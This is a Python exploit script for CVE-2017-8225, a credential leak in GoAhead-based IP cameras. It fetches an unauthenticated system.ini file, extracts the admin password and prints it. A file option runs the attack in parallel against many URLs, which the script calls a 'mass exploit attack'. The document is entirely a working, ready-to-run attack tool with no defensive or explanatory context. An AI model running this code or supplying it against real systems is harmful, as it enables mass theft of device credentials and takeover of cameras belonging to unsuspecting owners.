#!/bin/python3

import argparse
import requests
import re
from rich.console import Console
import threading
from rich.progress import Progress

color = Console()
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

user_agent = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

def ascii():
    color.print("""[bold cyan]
 ██████ ██    ██ ███████       ██████   ██████   ██ ███████        █████  ██████  ██████  ███████ 
██      ██    ██ ██                 ██ ██  ████ ███      ██       ██   ██      ██      ██ ██      
██      ██    ██ █████   █████  █████  ██ ██ ██  ██     ██  █████  █████   █████   █████  ███████ 
██       ██  ██  ██            ██      ████  ██  ██    ██         ██   ██ ██      ██           ██ 
 ██████   ████   ███████       ███████  ██████   ██    ██          █████  ███████ ███████ ███████   
    [/bold cyan]""")
    print("")
    print("-" * 7, "Coded By K3ysTr0K3R", "-" * 7)
    print("")

def exploit_vulnerability(url):
    full_url = f"{url}/system.ini?loginuse&loginpas"
    username = "admin"
    try:
        response = requests.get(full_url, timeout=7, headers=user_agent, verify=False)
        if response.status_code == 200:
            strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
            if username in strings:
                username_index = strings.index(username)
                password = strings[username_index + 1]
                color.print(f"[bold green][+][/bold green] {url} - ([yellow]{username}[/yellow]:[yellow]{password}[/yellow])")
    except Exception:
        pass

def main():
    parser = argparse.ArgumentParser(description="A PoC for CVE-2017-8225 GoAhead Credential Leak")
    parser.add_argument("url", help="The URL you want to exploit.")
    parser.add_argument("-f", "--file", action="store_true", help="Initiate mass exploit attack from URLs stored in a file.")
    args = parser.parse_args()

    if args.file:
        with open(args.url, "r") as file:
            urls = [line.strip() for line in file]
    else:
        urls = [args.url]

    threads = []
    with Progress() as progress:
        task = progress.add_task("[cyan]Exploiting", total=len(urls))
        for url in urls:
            thread = threading.Thread(target=exploit_vulnerability, args=(url,))
            threads.append(thread)
            thread.start()
            progress.update(task, advance=1)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ascii()
    main()
